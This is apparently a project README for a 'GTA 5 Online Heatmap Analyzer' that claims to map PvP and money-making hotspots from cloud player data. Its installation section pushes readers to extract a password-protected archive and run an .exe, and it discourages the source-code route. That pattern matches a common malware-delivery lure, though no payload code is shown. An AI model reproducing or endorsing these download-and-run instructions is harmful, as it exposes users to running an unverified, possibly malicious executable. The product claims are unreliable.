# 🚀 GTA 5 Online Heatmap Analyzer

## 📌 Description
**GTA 5 Online Heatmap Analyzer** is a desktop application that analyzes **player activity** and **PvP engagements** across the map of Los Santos.  
The software generates **interactive heatmaps** based on real-time cloud data, helping players find **hotspots for action and trade routes**.

🔹 Supported areas: **Los Santos & Blaine County**  
🔹 Data sources: **Cloud storage, player logs, custom CSV/JSON files**  
🔹 Analytics: **PvP hotspots, farming areas, risk zones**  

---

## 🎯 Features
✅ **Automatic cloud data loading** (live updates)  
✅ **PvP Heatmap generation** *(most active combat zones)*  
✅ **Business/Farming activity tracking** *(popular money-making areas)*  
✅ **Real-time data filtering** *(time-based, event-based)*  
✅ **Intuitive UI for better navigation**  

---

## 📥 Installation & Launch

### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
1️⃣ **Download and extract the `GameData_Analyzer.rar` (pass: 123Gamedata)  
2️⃣ **Run `Analyzer.exe`**  
🚀 **The application will set up everything automatically, just enjoy!**  

⚠️ **Important:** This method is **faster** and requires **no manual setup**!  

---

### 🔹 ❌ COMPLEX METHOD (For Developers Only)
❗ **This method is NOT recommended as it requires installing multiple dependencies manually.**  
❗ **Only use this if you know what you're doing!**  

#### 1️⃣ **Manually install dependencies**
```bash
pip install numpy matplotlib opencv-python PyQt5 requests folium
```

#### 2️⃣ **Launch with manual settings**
```bash
export PYTHONPATH=$(pwd)/src
python src/main.py --use-cloud-data --debug-mode --force-render
```

❌ **This method is harder, prone to errors, and requires manual configuration.**  
💡 **Just use the .exe, it handles everything automatically!**  

---

## 🖥 User Interface
🔹 **Main window** with a GTA 5 **interactive map**  
🔹 **Control panel** for **heatmap settings**  
🔹 **Data filtering** by time, regions, and player activity  

Example code for loading data and generating a heatmap:
```python
import numpy as np
import matplotlib.pyplot as plt

def generate_heatmap(data):
    heatmap, xedges, yedges = np.histogram2d(data[:,0], data[:,1], bins=(100,100))
    plt.imshow(heatmap.T, origin='lower', cmap='hot', alpha=0.75)
    plt.colorbar(label="Players")
    plt.title("GTA 5 Online Heatmap")
    plt.show()
```

---

## 🖼 Examples
📌 **Heatmap of high PvP activity areas:**  
![Heatmap](1.jpg)  

📌 **Business & trade route tracking:**  
![Trade Routes](2.jpg)  

---

## 🔗 Data Sources
The application supports **cloud-based data loading**.  
Example JSON file with event coordinates:
```json
[
    {"player": "User1", "event": "PvP", "x": 1523, "y": 3892},
    {"player": "User2", "event": "Cargo Sale", "x": 4023, "y": 2157}
]
```

---

## 🤝 Support & Contact
📌 **Join the community for updates and assistance!**  
📧 **Email:** cheatmeat@games.com  
